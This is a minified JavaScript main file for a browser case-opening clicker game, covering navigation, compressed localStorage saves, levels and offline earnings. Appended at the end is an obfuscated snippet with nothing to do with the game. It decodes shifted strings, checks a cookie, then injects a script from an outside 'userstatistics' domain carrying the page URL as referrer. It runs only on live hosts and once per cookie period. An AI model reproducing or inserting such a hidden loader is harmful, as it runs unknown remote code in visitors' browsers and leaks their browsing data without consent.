import{openCaseNavigateAway as e}from"/js/opencase.js?v=2.17";import{items as t,onload as o}from"/data/items.js?v=2.17";import"/js/inputs.js?v=2.17";import"/js/tips.js?v=2.17";import"/js/welcome.js?v=2.17";import"/js/sessions.js?v=2.17";import"/js/online/profile.js?v=2.17";import"/js/online/coinflip.js?v=2.17";import"/js/online/gifts.js?v=2.17";import"/js/casino.js?v=2.17";import{getItem as a,itemQualities as l,renderItem as r}from"/js/items.js?v=2.17";import n from"/js/select.js?v=2.17";import{game as i}from"/js/game.js?v=2.17";import{addStat as s}from"/js/achievements.js?v=2.17";import{generateConvlr as c}from"/js/itemsn.js?v=2.17";localStorage.flags||(localStorage.flags=""),o().then((()=>{setTimeout((()=>{document.body.classList.add("data-loaded"),c(),showPage("welcome"),i.emit("update"),n("#floating-item-example").appendChild(r(t["StatTrak USP-S | Neo-Noir (Factory New)"]));for(let e=user.inventory.length-1;e>=0;e--){let o=user.inventory[e];if(null===o){console.log("AY"),user.inventory.splice(e,1);continue}let r=a(o);if(r.masterItem)user.inventory.splice(e,1),user.inventory.push(`${r.short} (${l[r.qualities[0]]})`);else if(!t[o]){let r=o.replace("(Factory New)","").replace("(Minimal Wear)","").replace("(Field-Tested)","").replace("(Well-Worn)","").replace("(Battle-Scarred)","").trim(),n=r.startsWith("StatTrak"),i=r.startsWith("Souvenir");if(r=r.replace("Souvenir","").replace("StatTrak","").trim(),t[r]){let t=a(r);void 0===t.qualities[0]&&console.log(t);let o=`${t.short} (${l[t.qualities[0]]||"Vanilla"})`;n&&t.stattrakAvailable&&(o="StatTrak "+o),i&&t.souvenirAvailable&&(o="Souvenir "+o),user.inventory.splice(e,1),user.inventory.push(o)}else console.log("ITEM DOESN'T EXIST ANYMORE",o,r)}}}),500)})),import("/js/coinflip.js?v=2.17"),import("/js/jackpot.js?v=2.17"),import("/js/crash.js?v=2.17"),import("/js/mines.js?v=2.17"),import("/js/roulette.js?v=2.17"),import("/js/slots.js?v=2.17"),import("/js/click.js?v=2.17"),import("/js/inventory.js?v=2.17"),import("/js/shop.js?v=2.17"),import("/js/upgrades.js?v=2.17"),import("/js/inspectItem.js?v=2.17"),import("/js/lucky.js?v=2.17"),import("/js/stats.js?v=2.17"),import("/js/missions.js?v=2.17"),import("/js/collection.js?v=2.17"),import("/js/tradeup.js?v=2.17");let u=!1;"localhost"===window.location.hostname&&(u=!0,document.body.classList.add("dev"),document.title="(Development) Case Clicker 2 - MTSL");export let currentPage="";let d=[];export function showPage(t,o,a,l,r){document.body.focus();let n=t.split("$")[0],s=t.split("$")[1];currentPage=t,null===d[d.length-1]&&d.pop(),o?a||d.push(null):d.push(currentPage),l||i.emit("update",!0);let c=document.querySelectorAll("[page]");for(let e=0;e<c.length;e++)c[e].classList.remove("show");let u=document.querySelectorAll("[nbtn]");for(let e=0;e<u.length;e++)u[e].classList.remove("active"),u[e].getAttribute("nbtn")===n&&u[e].classList.add("active");if("opencase"===d[d.length-2]&&e(),i.emit("showPage",{page:n,data:s,direct:r}),!n)return;let g=document.querySelector("[page="+n+"]");g&&(g.classList.add("show"),g.onshow&&g.onshow())}export let user={money:240,tickets:0,tokens:0,xp:0,stats:{creation:(new Date).getTime()},inventory:["Spectrum Case"],upgrades:{},achievements:{},achievements_collected:{},luckyWheelWins:[]};function g(e){return encodeURIComponent(e).replace(/%([0-9A-F]{2})/g,(function e(t,o){return String.fromCharCode("0x"+o)}))}function p(e){return decodeURIComponent(e.split("").map((function(e){return"%"+("00"+e.charCodeAt(0).toString(16)).slice(-2)})).join(""))}function m(e){let l,t={},o=((e=g(e))+"").split(""),a=[],r=o[0],n=256;for(let e=1;e<o.length;e++)l=o[e],null!=t[r+l]?r+=l:(a.push(r.length>1?t[r]:r.charCodeAt(0)),t[r+l]=n,n++,r=l);return a.push(r.length>1?t[r]:r.charCodeAt(0)),a.map((e=>{let t=e.toString(36);return t.substring(0,t.length-1)+(t[t.length-1].match(/[0-9]/)?f[t[t.length-1]]:t[t.length-1].toUpperCase())})).join("")}u&&(window.user=()=>user),window.lzw_encode=m;let f={0:"=",1:"!",2:"?",3:"$",4:"%",5:"&",6:"/",7:"\\",8:"-",9:"+"},h={"=":"0","!":"1","?":"2",$:"3","%":"4","&":"5","/":"6","\\":"7","-":"8","+":"9"},v=Object.keys(h).join("");function S(e){let t=[],o="";for(let a=0;a<e.length;a++){let l=e[a];l.match(/[A-Z]/)||v.includes(l)?(o+=v.includes(l)?h[l]:l.toLowerCase(),t.push(parseInt(o,36)),o=""):o+=l}let s,a={},l=String.fromCharCode(t[0]),r=l,n=[l],i=256;for(let e=1;e<t.length;e++){let o=t[e];s=o<256?String.fromCharCode(t[e]):a[o]?a[o]:r+l,n.push(s),l=s[0],a[i]=r+l,i++,r=s}return p(n.join(""))}function w(e){let i,t={},o=(e+"").split(""),a=o[0],l=a,r=[a],n=256;for(let e=1;e<o.length;e++){let s=o[e].charCodeAt(0);i=s<256?o[e]:t[s]?t[s]:l+a,r.push(i),a=i.charAt(0),t[n]=l+a,n++,l=i}return r.join("")}function y(){return m(JSON.stringify(user))}function I(e){try{if("1"===e){localStorage.v1SaveSnapshot=localStorage.localsave;let e=w(localStorage.localsave).split("").map((e=>e.charCodeAt(0)-1)),t=new TextDecoder;return JSON.parse(t.decode(new Uint8Array(e)))}if("2"===e)return JSON.parse(S(localStorage.localsave))}catch(e){return console.error(e),delete localStorage._cbid,user}}function j(){if(!window.disableSaving)try{if(b)return;let e=y();localStorage.lsver="2",e&&(localStorage.localsave=e)}catch(e){alert("An error occurred doing auto save. Please report it via the discord server! --- "+e+" - LSL:"+(localStorage.localsave?.length||0)+" - GOL:"+JSON.stringify(user).length)}}localStorage.localsave&&(user=I(localStorage.lsver||"1")),localStorage.localuser||(localStorage.localuser=(new Date).getTime().toString(36)+"."+Math.floor(Math.random()*36**11).toString(36)),window.onbeforeunload=()=>j(),setInterval((()=>j()),1e4);let b=!1;window.wipeSave=function(){b=!0,delete localStorage._cbid,delete localStorage.localsave,delete localStorage.shop,delete localStorage.flags,delete localStorage.backup,delete localStorage.backupid,window.location.reload()},localStorage.backupid&&localStorage.backupid!==localStorage._cbid&&(document.getElementById("recover-btn").style.display="initial",document.getElementById("dismiss-recover-btn").style.display="initial",document.getElementById("recover-btn").onclick=()=>{confirm("Do you want to recover your old save? The current save will be lost.")&&(b=!0,localStorage._cbid=localStorage.backupid,localStorage.localsave=localStorage.backup,window.location.reload())},document.getElementById("dismiss-recover-btn").onclick=()=>{confirm("Are you sure?")&&(delete localStorage.backup,delete localStorage.backupid,localStorage._cbid=localStorage.localuser,document.getElementById("recover-btn").style.display="none",document.getElementById("dismiss-recover-btn").style.display="none")});let k=["Recruit","Private I","Private II","Private III","Private IV","Corporal I","Corporal II","Corporal III","Corporal IV","Sergeant I","Sergeant II","Sergeant III","Sergeant IV","Master Sergeant I","Master Sergeant II","Master Sergeant III","Master Sergeant IV","Sergeant Major I","Sergeant Major II","Sergeant Major III","Sergeant Major IV","Lieutenant I","Lieutenant II","Lieutenant III","Lieutenant IV","Captain I","Captain II","Captain III","Captain IV","Major I","Major II","Major III","Major IV","Colonel I","Colonel II","Colonel III","Brigadier General","Major General","Lieutenant General","General","Global General"];const P=.1;export function getPlayerLevel(){let e=0;return function t(){let o=Math.round(e**(P*e+1)*1e3),a=Math.round((e+1)**(P*(e+1)+1)*1e3);return a<=user.xp&&e<40?(++e,t()):{level:e,xps:o,xpa:user.xp-o,xpp:(user.xp-o)/(a-o),xpn:a-o}}()}i.on("update",(e=>{n("#money").innerText=numToString(user.money/100,2)+"€",n("#tickets").innerText=numToString(user.tickets),n("#tokens").innerText=numToString(user.tokens),n("#level-bar-text-left").innerText=numToString(getPlayerLevel().xpa)+"/"+numToString(getPlayerLevel().xpn)+" xp",n("#level-bar-text-right").innerText="level "+getPlayerLevel().level,n("#level-bar-p").style.width=100*getPlayerLevel().xpp+"%",n("#level-image").style.backgroundImage='url("images/level '+getPlayerLevel().level+'.png")',n("#level-title").innerText=k[getPlayerLevel().level],Array.from(document.querySelectorAll("[display]")).forEach((e=>{if("tokens"===e.getAttribute("display"))e.innerText=numToString(user.tokens)+" chips"})),e||showPage(currentPage,!0,!1,!1,!0)}));export function numToString(e,t=0){return(e=Math.floor(e*10**t)/10**t)<1e4?e.toFixed(t):e<1e6?e<1e5?Math.floor(e/10)/100+"k":Math.floor(e/100)/10+"k":e<1e9?e<1e7?Math.floor(e/1e4)/100+"m":Math.floor(e/1e5)/10+"m":e<1e12?Math.floor(e/1e8)/10+"t":e<1e15?Math.floor(e/1e11)/10+"q":void 0}document.onmousedown=e=>{e.path||(e.path=e.composedPath());for(let t=0;t<e.path.length-2;t++)if(e.path[t].classList.contains("dropdown"))return;for(let e=0;e<n(".dropdown").length;e++)n(".dropdown")[e].classList.remove("show");Array.from(document.getElementsByClassName("js-dropdown")).forEach((e=>{document.body.removeChild(e)}))};export function goToPreviousPage(){d.length>1&&(d.pop(),showPage(d[d.length-1],!0,!0))}let T=document.querySelectorAll("[showpage]");for(let e=0;e<T.length;e++)T[e].onclick=()=>showPage(T[e].getAttribute("showpage"));function L(e){e=parseInt(e);for(let e=1;e<=3;e++)document.body.classList.remove("graphics-level-"+e);for(let t=1;t<=e;t++)document.body.classList.add("graphics-level-"+t);localStorage.graphicsLevel=e,window.graphicsLevel=e,n("#current-graphic-level").innerText=["Super Low","Low","Medium","Ultra"][e]}L(localStorage.graphicsLevel||1),window.setGraphicsLevel=L;export function setAlwaysCompact(e){e=e+""=="true",localStorage.compactMode=e,window.alwaysCompact=e,C()}function C(){window.innerHeight<=850||window.innerWidth<=1150?(n("#toggle-compact").innerText="Compact is enabled by default due to screen resolution",n("#toggle-compact").disabled=!0):(n("#toggle-compact").innerText="Toggle Compact",n("#toggle-compact").disabled=!1),document.body.classList.toggle("compact",window.innerHeight<=850||window.innerWidth<=1150||alwaysCompact),document.body.classList.toggle("natural-compact",window.innerHeight<=850||window.innerWidth<=1150)}function x(e,t){let o=Math.min(t,user.upgrades.offlineBank||7500);const a=document.body.q(".dialog-overlay");a.q(".floating-dialog",{c:[q(".floating-dialog-header",{c:[q(".floating-dialog-title","Offline Earnings"),q(".floating-dialog-close",{onclick(){document.body.removeChild(a)}})]}),q(".floating-dialog-body",{c:[q(".floating-dialog-text",`Welcome back! You have earned ${(o/100).toFixed(2)} € while being offline!`),o<t&&q(".floating-dialog-text",`But if your offline bank capacity was higher, you could have earned ${(t/100).toFixed(2)} €...`)]})]})}function M(){let e=Math.ceil((new Date).getTime()/1e3)-parseInt(localStorage.lastSeen,36),t=Math.floor((user.upgrades.passiveIncome||0)*((user.upgrades.offlineIncome||0)/100)*e);t>100&&(x(e,t),user.money+=Math.min(t,user.upgrades.offlineBank||7500),s("earned_cash",Math.min(t,user.upgrades.offlineBank||7500)),i.emit("update"))}setAlwaysCompact(localStorage.compactMode||!1),window.setAlwaysCompact=setAlwaysCompact,window.addEventListener("touchstart",(function(e){"BUTTON"!==e.target.tagName&&e.target.classList.contains("item")&&e.preventDefault()}),{passive:!1}),window.addEventListener("keydown",(e=>{"Escape"===e.key&&goToPreviousPage()})),window.addEventListener("resize",(()=>i.emit("update"))),window.addEventListener("resize",(()=>C())),C(),setInterval((()=>{user.money+=user.upgrades.passiveIncome||0,s("earned_cash",user.upgrades.passiveIncome||0),i.emit("update",!0)}),1e3),setInterval((()=>{localStorage.lastSeen=Math.floor((new Date).getTime()/1e3).toString(36)}),1e3),M(),setTimeout((()=>i.emit("update")),100),document.body.classList.add("game-ready"),setInterval((()=>{user.seasonTimePlayed||(user.seasonTimePlayed=0),user.seasonTimePlayed+=1,s("time_played",1)}),1e3),window.addEventListener("keydown",(e=>{"INPUT"!==document.activeElement.tagName&&("click"!==currentPage&&"e"===e.key&&showPage("click"),"shop"!==currentPage&&"s"===e.key&&showPage("shop"),"betting"!==currentPage&&"g"===e.key&&showPage("betting"),"upgrades"!==currentPage&&"u"===e.key&&showPage("upgrades"),"missions"!==currentPage&&"m"===e.key&&showPage("missions"),"achievements"!==currentPage&&"a"===e.key&&showPage("achievements"),"collection"!==currentPage&&"c"===e.key&&showPage("collection"),"tradeup"!==currentPage&&"t"===e.key&&showPage("tradeup"),"INPUT"===document.activeElement.tagName&&e.preventDefault())})),localStorage.backupid&&localStorage.backupid!==localStorage._cbid||(localStorage.backup=localStorage.localsave,localStorage._cbid=Math.random(),localStorage.backupid=localStorage._cbid);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));